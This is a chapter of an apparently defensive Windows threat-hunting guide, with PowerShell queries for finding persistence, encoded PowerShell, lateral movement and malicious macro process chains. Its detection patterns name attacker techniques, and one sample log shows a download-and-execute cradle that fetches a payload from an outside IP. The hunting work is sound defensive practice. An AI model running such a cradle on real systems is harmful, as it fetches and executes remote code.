# 05 — Threat Hunting

> **Philosophy:** Threat hunting is proactive — you assume a breach has already occurred and look for evidence the attacker left behind, rather than waiting for an alert.  
> **Run as:** Local or Domain Administrator. Many queries require elevated privileges.

---

## ⚡ Quick Reference

| Hunt | What You're Looking For |
|------|------------------------|
| [Suspicious Scheduled Tasks](#1-hunting-suspicious-scheduled-tasks) | Persistence via Task Scheduler |
| [Registry Run Keys](#2-hunting-registry-run-keys) | Persistence via registry auto-run |
| [Encoded PowerShell](#3-detecting-encoded-powershell) | Obfuscated command execution |
| [Unusual Services](#4-hunting-unusual-services) | Persistence via Windows services |
| [WMI/SMB Lateral Movement](#5-lateral-movement-via-wmismb) | Attacker moving through your network |
| [Parent-Child Process Analysis](#6-parent-child-process-analysis-via-event-logs) | Abnormal process spawning chains |

---

## 1. Hunting Suspicious Scheduled Tasks

### What you're looking for
Attackers use scheduled tasks to re-run their malware after reboots or at regular intervals. Red flags:
- Tasks in non-standard paths (not `\Microsoft\Windows\*`)
- Tasks running from `%TEMP%`, `%APPDATA%`, or user profile directories
- Tasks using encoded PowerShell (`-enc` or `-encodedcommand`)
- Tasks running as `SYSTEM` created by a non-admin user
- Tasks with random/meaningless names

### Hunt Query

```powershell
# Get all non-Microsoft scheduled tasks with full action detail
Get-ScheduledTask |
    Where-Object { $_.TaskPath -notlike '\Microsoft\*' -and $_.TaskPath -notlike '\Microsoft*' } |
    ForEach-Object {
        $task = $_
        $actions = $task.Actions | ForEach-Object { "$($_.Execute) $($_.Arguments)" }
        [PSCustomObject]@{
            TaskName   = $task.TaskName
            TaskPath   = $task.TaskPath
            State      = $task.State
            RunAs      = $task.Principal.UserId
            Actions    = $actions -join ' | '
            Source     = (Get-ScheduledTaskInfo -TaskName $task.TaskName -TaskPath $task.TaskPath -ErrorAction SilentlyContinue).LastRunTime
        }
    } |
    # Flag suspicious patterns
    Where-Object {
        $_.Actions -match 'temp|appdata|public|downloads|enc|encodedcommand|bypass|hidden|IEX|Invoke-Expression' -or
        $_.Actions -match '^[a-z0-9]{8,}\.exe'   # random-looking executable names
    } |
    Format-Table -AutoSize -Wrap
```

### Sample Output
```
TaskName       TaskPath  State  RunAs   Actions
--------       --------  -----  -----   -------
WindowsHelper  \         Ready  SYSTEM  powershell.exe -enc JABjAD0AbgBlAHcALW...
upd            \Custom\  Ready  jsmith  C:\Users\jsmith\AppData\Roaming\upd.exe
```

### Tips & Warnings
> ⚠️ Any task with `-enc` or `-encodedcommand` in the arguments is a high-priority finding. Decode immediately:
> ```powershell
> $b64 = "JABjAD0AbgBlAHcALW..."
> [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b64))
> ```

---

## 2. Hunting Registry Run Keys

### What you're looking for
The Windows registry has well-known "autorun" locations that execute programs at startup or user login. These are the most common persistence locations after scheduled tasks.

**Key locations to check:**
- `HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
- `HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
- `HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run` (32-bit on 64-bit OS)

### Hunt Query

```powershell
$runKeys = @(
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\SYSTEM\CurrentControlSet\Services"
)

foreach ($key in $runKeys) {
    if (Test-Path $key) {
        $entries = Get-ItemProperty -Path $key -ErrorAction SilentlyContinue
        $entries.PSObject.Properties |
            Where-Object { $_.Name -notmatch '^PS' } |
            ForEach-Object {
                [PSCustomObject]@{
                    RegistryKey = $key
                    ValueName   = $_.Name
                    Value       = $_.Value
                    Suspicious  = ($_.Value -match 'temp|appdata|public|enc|bypass|hidden|IEX|\.vbs|\.ps1|cmd\.exe') -or
                                  ($_.Value -match '^[a-z]{5,10}\.exe')
                }
            }
    }
} | Sort-Object Suspicious -Descending | Format-Table -AutoSize -Wrap
```

### Sample Output
```
RegistryKey                                      ValueName        Value                           Suspicious
-----------                                      ---------        -----                           ----------
HKCU:\SOFTWARE\...\Run                           OneDriveUpdate   C:\Users\Public\svchost32.exe   True
HKLM:\SOFTWARE\...\Run                           SecurityHealth   C:\Windows\System32\SecurityHealthSystray.exe  False
```

### Tips & Warnings
> ⚠️ `svchost32.exe` in `C:\Users\Public\` is a textbook malware naming trick — masquerading as a Windows system process while running from a user-writable directory.

> 💡 For remote hunting, wrap queries in `Invoke-Command`:
> ```powershell
> Invoke-Command -ComputerName "PC01","PC02","SERVER01" -ScriptBlock {
>     Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
> }
> ```

---

## 3. Detecting Encoded PowerShell

### What you're looking for
Attackers encode their PowerShell commands in base64 to bypass simple keyword filtering. The telltale sign is `powershell.exe -enc` or `-encodedcommand` in process arguments or event logs. Also look for `IEX` (Invoke-Expression) and `DownloadString` patterns.

### Hunt Query — Event Logs (Requires Process Creation Auditing)

```powershell
# Search process creation events for encoded PowerShell
$since = (Get-Date).AddDays(-7)
Get-WinEvent -FilterHashtable @{
    LogName   = 'Security'
    Id        = 4688
    StartTime = $since
} -ErrorAction SilentlyContinue |
    Where-Object { $_.Message -match '-enc|-encodedcommand|IEX|Invoke-Expression|DownloadString|FromBase64' } |
    Select-Object TimeCreated,
        @{n='User'; e={$_.Properties[6].Value}},
        @{n='ProcessName'; e={$_.Properties[5].Value}},
        @{n='CommandLine'; e={$_.Properties[8].Value}} |
    Format-Table -AutoSize -Wrap
```

### Hunt Query — PowerShell Script Block Logging (Event ID 4104)

```powershell
# PowerShell script block logs capture actual decoded commands
Get-WinEvent -FilterHashtable @{
    LogName   = 'Microsoft-Windows-PowerShell/Operational'
    Id        = 4104
    StartTime = (Get-Date).AddDays(-7)
} -ErrorAction SilentlyContinue |
    Where-Object { $_.Message -match 'IEX|Invoke-Expression|Net\.WebClient|DownloadString|Reflection\.Assembly|shellcode' } |
    Select-Object TimeCreated,
        @{n='ScriptBlock'; e={$_.Properties[2].Value}} |
    Format-List
```

### Sample Output
```
TimeCreated : 3/29/2026 3:12:00 AM
ScriptBlock : IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.45/payload.ps1')
```

### Tips & Warnings
> ⚠️ **`IEX (New-Object Net.WebClient).DownloadString(...)`** is the most common PowerShell malware delivery pattern — downloads and executes a remote script in memory without touching disk.

> 💡 **Enable these audit policies** to make this hunt effective:
> ```powershell
> # Enable PowerShell Script Block Logging
> Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" `
>     -Name "EnableScriptBlockLogging" -Value 1 -Type DWord -Force
>
> # Enable Process Creation auditing with command line
> auditpol /set /subcategory:"Process Creation" /success:enable
> Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" `
>     -Name "ProcessCreationIncludeCmdLine_Enabled" -Value 1 -Type DWord -Force
> ```

---

## 4. Hunting Unusual Services

### What you're looking for
Malware often installs itself as a Windows service for persistence — it runs as SYSTEM at boot without requiring user interaction. Red flags:
- Services running from unusual paths (`%TEMP%`, `%APPDATA%`, `C:\Users\`)
- Services with random names or descriptions
- Services installed very recently
- Services using `cmd.exe` or `powershell.exe` as their image path

### Hunt Query

```powershell
# Get all non-Microsoft services with their paths
Get-WmiObject Win32_Service |
    Where-Object {
        $_.PathName -ne $null -and
        $_.PathName -notmatch 'System32|SysWOW64|Program Files|Windows Defender|MsMpEng'
    } |
    Select-Object Name, DisplayName, State, StartMode,
        @{n='RunAs'; e={$_.StartName}},
        @{n='Path'; e={$_.PathName}},
        @{n='Suspicious'; e={
            $_.PathName -match 'temp|appdata|public|users\\[^\\]+\\(?!appdata\\local\\programs)' -or
            $_.PathName -match 'cmd\.exe|powershell\.exe|wscript|cscript'
        }} |
    Sort-Object Suspicious -Descending |
    Format-Table -AutoSize -Wrap
```

### Cross-reference with recent service installation events

```powershell
Get-WinEvent -FilterHashtable @{
    LogName   = 'System'
    Id        = 7045
    StartTime = (Get-Date).AddDays(-30)
} -ErrorAction SilentlyContinue |
    Select-Object TimeCreated,
        @{n='ServiceName'; e={$_.Properties[0].Value}},
        @{n='ImagePath'; e={$_.Properties[1].Value}},
        @{n='ServiceType'; e={$_.Properties[2].Value}},
        @{n='StartType'; e={$_.Properties[3].Value}},
        @{n='AccountName'; e={$_.Properties[4].Value}} |
    Format-Table -AutoSize
```

### Tips & Warnings
> ⚠️ A service with `cmd.exe /c "powershell -enc ..."` as its image path is almost certainly malicious. Document and investigate immediately.

---

## 5. Lateral Movement via WMI/SMB

### What you're looking for
After gaining initial access, attackers move laterally — spreading to other systems. WMI (Windows Management Instrumentation) and SMB (Server Message Block) are commonly abused. Signs:
- WMI process creation from remote IP addresses
- `net use` or `net share` connections to sensitive systems
- Unusual authentication events (4648 — logon with explicit credentials)

### Hunt for WMI-based lateral movement

```powershell
# Event ID 4648 - logon with explicit credentials (often lateral movement)
Get-WinEvent -FilterHashtable @{
    LogName   = 'Security'
    Id        = 4648
    StartTime = (Get-Date).AddDays(-7)
} -ErrorAction SilentlyContinue |
    Select-Object TimeCreated,
        @{n='AccountUsed'; e={$_.Properties[5].Value}},
        @{n='TargetServer'; e={$_.Properties[8].Value}},
        @{n='ProcessName'; e={$_.Properties[11].Value}} |
    Where-Object { $_.ProcessName -match 'wmic|wmiprvse|powershell|cmd|psexec' } |
    Format-Table -AutoSize
```

### Hunt for SMB connections to admin shares

```powershell
# Event ID 5140 - network share was accessed (requires audit policy)
Get-WinEvent -FilterHashtable @{
    LogName   = 'Security'
    Id        = 5140
    StartTime = (Get-Date).AddDays(-1)
} -ErrorAction SilentlyContinue |
    Select-Object TimeCreated,
        @{n='Account'; e={$_.Properties[1].Value}},
        @{n='ShareName'; e={$_.Properties[7].Value}},
        @{n='SourceAddress'; e={$_.Properties[4].Value}} |
    Where-Object { $_.ShareName -match 'ADMIN\$|C\$|IPC\$' } |
    Format-Table -AutoSize
```

### Hunt for active SMB connections

```powershell
# Find active inbound SMB connections (port 445)
Get-NetTCPConnection -LocalPort 445 -State Established |
    Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort,
        @{n='RemoteHost'; e={
            try { [System.Net.Dns]::GetHostEntry($_.RemoteAddress).HostName }
            catch { $_.RemoteAddress }
        }}
```

### Tips & Warnings
> ⚠️ `wmic.exe` connecting to remote systems via 4648 events is a classic PsExec/WMI lateral movement pattern used by tools like Cobalt Strike and Mimikatz.

> 💡 Enable **WMI activity logging** for deeper visibility:
> ```powershell
> wevtutil sl Microsoft-Windows-WMI-Activity/Operational /e:true
> ```

---

## 6. Parent-Child Process Analysis via Event Logs

### What you're looking for
Normal parent-child process relationships are predictable — `explorer.exe` spawns apps, `services.exe` spawns services, `svchost.exe` hosts service DLLs. Malware often creates abnormal chains like `word.exe → powershell.exe → cmd.exe → net.exe` (macro-based attack).

### Hunt Query — Abnormal Parent Processes

```powershell
# Event ID 4688 includes ParentProcessName (when command line auditing is enabled)
$since = (Get-Date).AddDays(-3)
Get-WinEvent -FilterHashtable @{
    LogName   = 'Security'
    Id        = 4688
    StartTime = $since
} -ErrorAction SilentlyContinue |
    Select-Object TimeCreated,
        @{n='ParentProcess'; e={$_.Properties[13].Value}},
        @{n='NewProcess'; e={$_.Properties[5].Value}},
        @{n='CommandLine'; e={$_.Properties[8].Value}},
        @{n='User'; e={$_.Properties[6].Value}} |
    Where-Object {
        # Abnormal parents spawning shells or interpreters
        ($_.ParentProcess -match 'winword|excel|powerpnt|outlook|chrome|firefox|iexplore|acrobat') -and
        ($_.NewProcess -match 'powershell|cmd\.exe|wscript|cscript|mshta|wmic|regsvr32|rundll32')
    } |
    Format-Table -AutoSize -Wrap
```

### Sample Output
```
TimeCreated              ParentProcess                         NewProcess                      CommandLine
-----------              -------------                         ----------                      -----------
3/29/2026 10:23:00 AM    C:\Program Files\...\WINWORD.EXE      C:\Windows\System32\cmd.exe     cmd.exe /c powershell -enc JAB...
```

### Tips & Warnings
> ⚠️ **Word spawning cmd spawning PowerShell** is the textbook phishing macro attack chain. This single event should trigger immediate escalation and isolation of the affected workstation.

> 💡 **LOLBAS (Living off the Land Binaries)** — tools like `mshta.exe`, `regsvr32.exe`, and `rundll32.exe` can execute arbitrary code and are commonly spawned maliciously. Any unexpected parent process spawning these should be investigated.

> 💡 For deeper hunting without needing 4688 audit policy, use **Sysmon** (free Sysinternals tool) which logs process creation with parent info to Event ID 1:
> ```powershell
> Get-WinEvent -LogName 'Microsoft-Windows-Sysmon/Operational' |
>     Where-Object { $_.Id -eq 1 -and $_.Message -match 'ParentImage.*winword' }
> ```

---

## Navigation

| ← Previous | Home | Next → |
|-----------|------|--------|
| [04 — Incident Response](04-Incident-Response.md) | [README](../README.md) | [06 — Vulnerability Management](06-Vulnerability-Management.md) |
